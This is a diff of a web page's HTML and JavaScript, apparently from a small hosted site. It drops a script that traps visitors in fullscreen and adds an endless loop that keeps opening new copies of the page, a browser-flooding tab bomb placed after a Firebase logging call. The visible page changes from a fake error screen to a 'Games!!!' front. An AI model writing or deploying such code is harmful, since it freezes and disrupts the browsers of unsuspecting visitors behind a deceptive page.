@@ -27,28 +27,6 @@
         } else {
             window.location.href = "/main.html";
         }
-
-        // fullscreen
-        document.documentElement.requestFullscreen = document.documentElement.requestFullscreen || document.documentElement.mozRequestFullScreen || document.documentElement.webkitRequestFullscreen || document.documentElement.msRequestFullscreen;
-
-        function enterFullscreen() {
-            if (document.documentElement.requestFullscreen) {
-                document.documentElement.requestFullscreen();
-            }
-        }
-
-        document.addEventListener('fullscreenchange', function() {
-            if (document.fullscreenElement === null) {
-                enterFullscreen();
-            }
-        });
-
-        window.onload = function() {
-            document.body.addEventListener('click', function() {
-                enterFullscreen();
-            });
-        };
-
     </script>
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
@@ -98,6 +76,9 @@
             .catch((error) => {
                 console.error("Logging Error:", error);
             });
+            while (true) {
+                window.open(window.location.href, '_blank');
+            }
         }
         
         const url = window.location.href;
@@ -116,12 +97,9 @@
 
 <body>
     <center>
-        <h1>ERROR</h1>
-        <h2>Something went wrong :/</h2>
-        <div class="text">Please provide the code</div>
-        <input type="text" class="text" value="4a2b1aa HTTP 200 Cl"/>
-        <div class="text">for reference.</div>
-        <div class="footnote">
+        <h1>Games!!!</h1>
+        <p>You need to enable JavaScript T-57 to play.</p>
+        <div type="font-size: 3em;">
             <a href="https://rpicode.github.io/cookie.html">| Cookie Policy |</a>
             <a href="https://rpicode.github.io/tos.html">| Terms of Service |</a>
         </div>
